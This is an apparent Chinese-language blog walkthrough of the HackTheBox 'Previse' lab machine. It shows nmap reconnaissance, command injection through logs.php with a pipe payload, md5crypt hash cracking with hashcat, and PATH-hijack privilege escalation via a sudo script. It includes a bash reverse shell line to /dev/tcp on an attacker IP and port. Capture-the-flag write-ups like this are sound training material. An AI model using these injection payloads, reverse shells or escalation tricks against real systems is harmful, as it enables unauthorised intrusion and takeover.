---
title: HackTheBox-Previse
typora-root-url: ..
date: 2021-12-27 09:14:33
tags: HTB
---

## 简介

hostname:Previse

IP:10.10.11.104

OS:linux



## 信息收集

常规nmap扫描

```
nmap -sS -A -sC -sV -p- --min-rate 1000 10.10.11.104
```

```
22/tcp open  ssh     (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
| http-title: Previse Login
|_Requested resource was login.php
```



80端口是一个登陆页面， 目录扫描 未发现可用线索。

登陆账号输入 admin:admin 进入系统 （此处还有一个方法是 通过修改响应状态码，绕过权限校验，进入添加账号的界面）

![image-20211227092701943](/assets/image-20211227092701943.png)

可以看见admin用户上传了一个siteBackup.zip，应该是网站备份，先下载下来。

## 攻击阶段

### 命令执行

logs.php 中含有系统 命令执行 方法，并且接收前端传入的参数

![image-20211227093152969](/assets/image-20211227093152969.png)



构造payload  `|pwd > /var/www/out.log`

![image-20211227093828162](/assets/image-20211227093828162.png)

反弹拿到权限

![image-20211227094630024](/assets/image-20211227094630024.png)

获取交互式shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

但当前权限还无法读取 user.txt

```
-r-------- 1 m4lwhere m4lwhere 33 Dec 27 00:53 user.txt
```

 

### hashcat破解密码

结合刚才在源码中发现的mysql账号密码，登陆数据库查看

![image-20211227102113325](/assets/image-20211227102113325.png)

发现这里有一个 m4lwhere 用户，尝试用hashcat爆破密码。

查看源码，其加密方式与linux shadow密码加密一致，构造下格式,写入 a.hash 文件

```
m4lwhere:$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:18988:0:99999:7:::
```

使用hashcat进行破解

```
hashcat -m 500 -a 0 a.hash rockyou.txt --self-test-disable
```

![image-20211227110750901](/assets/image-20211227110750901.png)

破解到密码  `ilovecody112235!` ，使用su切换身份，获取到user flag

## 提权

sudo -l 收集到 用户可sudo执行一个脚本 /opt/scripts/access_backup.sh 

![image-20211227112335761](/assets/image-20211227112335761.png)

审计该脚本，由于 gzip没有写绝对路径，可使用环境变量提权法

### 环境变量提权

```bsh
echo "/bin/bash" > /tmp/gzip
chmod 777 /tmp/gzip
echo $PATH
export PATH=/tmp:$PATH
sudo /opt/scripts/access_backup.sh
```

![image-20211227112630408](/assets/image-20211227112630408.png)



或者直接在gzip 文件中写入反弹shell命令

```
bash -c 'exec bash -i &>/dev/tcp/10.10.14.52/5555 <&1'

sudo /opt/scripts/access_backup.sh
```

即可接收到root权限的反弹shell

![image-20211227112853191](/assets/image-20211227112853191.png)
